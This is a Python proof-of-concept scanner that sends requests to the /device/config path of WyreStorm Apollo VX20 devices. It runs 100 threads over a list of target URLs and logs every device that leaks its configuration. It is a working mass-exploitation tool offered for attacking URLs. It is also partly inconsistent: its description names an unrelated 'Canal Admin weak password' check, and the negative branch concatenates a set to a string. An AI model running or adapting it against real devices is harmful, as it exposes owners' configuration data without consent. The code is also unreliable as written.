import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="Canal Admin weak password")
    parser.add_argument('-u','--url',help='Please input your attack url')
    parser.add_argument('-f','--file',help='Please input your attack file')
    args = parser.parse_args()
    
    if args.url and not args.file :
            poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('/n',''))
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
            print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def banner():
    test="""
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████
"""
    print(test)
    # 漏洞检测poc模块
def poc(target):
    url = target + '/device/config'
    headers ={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    }
    try:
        res = requests.get(url=url,verify=False).text
        if 'ipmode' in res:
              with open(r'E:\Learning file\pythonxuexi\poc\poc1\kaoshi\WyreStorm Apollo VX20 信息泄露漏洞\data.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'存在敏感信息泄露')
        else:
             print('[-]'+{target}+'不存在敏感信息泄露')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__' :
    main()